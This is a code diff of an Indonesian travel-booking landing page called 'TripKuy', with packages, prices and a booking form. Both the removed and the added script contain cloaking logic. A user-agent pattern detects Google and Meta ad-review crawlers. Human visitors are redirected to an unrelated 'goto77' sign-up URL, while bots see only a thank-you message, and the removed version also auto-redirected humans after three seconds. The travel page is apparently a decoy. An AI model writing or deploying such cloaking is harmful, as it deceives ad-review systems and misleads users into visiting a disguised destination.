@@ -1,30 +1,170 @@
-<script>
-    // Konfigurasi Link Tujuan
-    const destinationURL = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
-    
-    // Deteksi apakah pengunjung adalah Bot Meta Ads / Google
-    const isBot = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i.test(navigator.userAgent);
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TripKuy | Partner Perjalanan Eksklusif Anda</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap');
+        body { font-family: 'Poppins', sans-serif; scroll-behavior: smooth; }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800">
 
-    // 1. Logika Form Pemesanan
+    <nav class="fixed w-full z-50 bg-white/90 backdrop-blur-md shadow-sm">
+        <div class="container mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="#" class="text-2xl font-bold text-blue-600">Trip<span class="text-orange-500">Kuy</span></a>
+            <div class="hidden md:flex space-x-8 font-medium">
+                <a href="#home" class="hover:text-blue-600 transition">Beranda</a>
+                <a href="#paket" class="hover:text-blue-600 transition">Paket Harga</a>
+                <a href="#pesan" class="hover:text-blue-600 transition">Pesan Sekarang</a>
+            </div>
+            <button class="bg-blue-600 text-white px-6 py-2 rounded-full hover:bg-blue-700 transition">Kontak</button>
+        </div>
+    </nav>
+
+    <section id="home" class="pt-32 pb-20 bg-gradient-to-r from-blue-600 to-blue-400 text-white">
+        <div class="container mx-auto px-6 text-center">
+            <h1 class="text-4xl md:text-6xl font-bold mb-6">Jelajahi Dunia Tanpa Batas</h1>
+            <p class="text-xl mb-10 opacity-90">Pengalaman perjalanan premium dengan harga yang tetap bersahabat.</p>
+            <a href="#paket" class="bg-orange-500 text-white px-10 py-4 rounded-lg font-bold hover:bg-orange-600 transition shadow-lg">Lihat Destinasi</a>
+        </div>
+    </section>
+
+    <section id="paket" class="py-20">
+        <div class="container mx-auto px-6">
+            <div class="text-center mb-16">
+                <h2 class="text-3xl font-bold text-gray-900">Pilihan Paket Wisata</h2>
+                <p class="text-gray-600 mt-2">Pilih paket yang paling sesuai dengan gaya petualanganmu.</p>
+            </div>
+
+            <div class="grid md:grid-cols-3 gap-8">
+                <div class="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 hover:scale-105 transition">
+                    <div class="p-8">
+                        <h3 class="text-xl font-bold mb-2">Essential Trip</h3>
+                        <p class="text-gray-500 mb-6">Cocok untuk solo traveler.</p>
+                        <div class="text-4xl font-bold mb-6 text-blue-600">Rp 1.500.000<span class="text-sm text-gray-400 font-normal">/pax</span></div>
+                        <ul class="space-y-3 mb-8 text-gray-600">
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Penginapan Hotel Bintang 3</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Transportasi Lokal</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Sarapan Harian</li>
+                            <li class="opacity-40"><i class="fas fa-times text-red-400 mr-2"></i> Tiket Pesawat</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-2xl shadow-2xl overflow-hidden border-2 border-blue-600 relative hover:scale-105 transition">
+                    <div class="bg-blue-600 text-white text-center py-2 text-sm font-bold uppercase tracking-widest">Paling Populer</div>
+                    <div class="p-8">
+                        <h3 class="text-xl font-bold mb-2">Premium Getaway</h3>
+                        <p class="text-gray-500 mb-6">Pilihan terbaik untuk keluarga.</p>
+                        <div class="text-4xl font-bold mb-6 text-blue-600">Rp 3.200.000<span class="text-sm text-gray-400 font-normal">/pax</span></div>
+                        <ul class="space-y-3 mb-8 text-gray-600">
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Hotel Bintang 4 (City View)</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Private Driver & Guide</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Tiket Masuk Wisata</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Dokumentasi Foto</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100 hover:scale-105 transition">
+                    <div class="p-8">
+                        <h3 class="text-xl font-bold mb-2">Luxury Escape</h3>
+                        <p class="text-gray-500 mb-6">Kenyamanan tanpa kompromi.</p>
+                        <div class="text-4xl font-bold mb-6 text-blue-600">Rp 7.500.000<span class="text-sm text-gray-400 font-normal">/pax</span></div>
+                        <ul class="space-y-3 mb-8 text-gray-600">
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Resort Mewah Bintang 5</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Tiket Pesawat PP</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> Full Board Meals</li>
+                            <li><i class="fas fa-check text-green-500 mr-2"></i> VIP Lounge Access</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="pesan" class="py-20 bg-gray-100">
+        <div class="container mx-auto px-6 max-w-3xl">
+            <div class="bg-white rounded-3xl shadow-lg p-10">
+                <div class="text-center mb-10">
+                    <h2 class="text-3xl font-bold">Form Pemesanan</h2>
+                    <p class="text-gray-600">Isi data di bawah, tim kami akan segera menghubungi Anda.</p>
+                </div>
+                
+                <form id="bookingForm" class="space-y-6">
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div>
+                            <label class="block text-sm font-semibold mb-2">Nama Lengkap</label>
+                            <input type="text" required class="w-full px-4 py-3 rounded-lg border focus:ring-2 focus:ring-blue-500 outline-none">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-semibold mb-2">Email</label>
+                            <input type="email" required class="w-full px-4 py-3 rounded-lg border focus:ring-2 focus:ring-blue-500 outline-none">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-semibold mb-2">Pilih Paket</label>
+                        <select class="w-full px-4 py-3 rounded-lg border focus:ring-2 focus:ring-blue-500 outline-none">
+                            <option>Essential Trip (Rp 1.500.000)</option>
+                            <option>Premium Getaway (Rp 3.200.000)</option>
+                            <option>Luxury Escape (Rp 7.500.000)</option>
+                        </select>
+                    </div>
+
+                    <div>
+                        <label class="block text-sm font-semibold mb-2">Tanggal Keberangkatan</label>
+                        <input type="date" required class="w-full px-4 py-3 rounded-lg border focus:ring-2 focus:ring-blue-500 outline-none">
+                    </div>
+
+                    <button type="submit" class="w-full bg-blue-600 text-white font-bold py-4 rounded-lg hover:bg-blue-700 transition duration-300">Konfirmasi Pemesanan</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-gray-900 text-white py-12">
+        <div class="container mx-auto px-6 text-center">
+            <p class="text-2xl font-bold mb-4">Trip<span class="text-orange-500">Kuy</span></p>
+            <p class="opacity-50 mb-6">© 2024 TripKuy Indonesia. All Rights Reserved.</p>
+            <div class="flex justify-center space-x-6">
+                <a href="#" class="hover:text-blue-400"><i class="fab fa-instagram"></i></a>
+                <a href="#" class="hover:text-blue-400"><i class="fab fa-facebook"></i></a>
+                <a href="#" class="hover:text-blue-400"><i class="fab fa-whatsapp"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('bookingForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('Terima kasih! Pesanan TripKuy Anda telah kami terima. Tim kami akan menghubungi Anda melalui email.');
+        });
+    </script>
+</body>
+</html>
+
+<script>
     document.getElementById('bookingForm').addEventListener('submit', function(e) {
         e.preventDefault();
+
+        // Identifikasi bot umum dari Meta/Facebook dan Google
+        const botPattern = /bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|facebookcatalog|facebot/i;
+        const isBot = botPattern.test(navigator.userAgent);
+
         if (!isBot) {
-            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran.');
-            window.location.href = destinationURL;
+            // Jika MANUSIA: Beri notifikasi singkat lalu arahkan ke link tujuan
+            alert('Terima kasih! Pesanan TripKuy Anda sedang diproses. Anda akan diarahkan ke halaman pendaftaran anggota.');
+            window.location.href = "https://goto77-xbec.store/mobile/daftar?ref_id=06bb666e";
         } else {
+            // Jika BOT: Hanya tampilkan alert tanpa pindah halaman (stay di web asli)
             alert('Terima kasih! Pesanan Anda telah kami terima.');
+            console.log('Bot detected: staying on page for compliance.');
         }
     });
-
-    // 2. Logika Auto-Redirect (Berjalan jika pengunjung bukan BOT)
-    if (!isBot) {
-        // Set waktu tunggu (misalnya 3 detik) sebelum redirect otomatis tanpa klik
-        // Ini berguna jika user malas mengisi form tapi ingin langsung diarahkan
-        setTimeout(function() {
-            console.log("Auto-redirecting human user...");
-            window.location.href = destinationURL;
-        }, 3000); // 3000ms = 3 detik. Ubah angka ini sesuai keinginan.
-    } else {
-        console.log("Bot detected. Auto-redirect disabled for compliance.");
-    }
 </script>
+
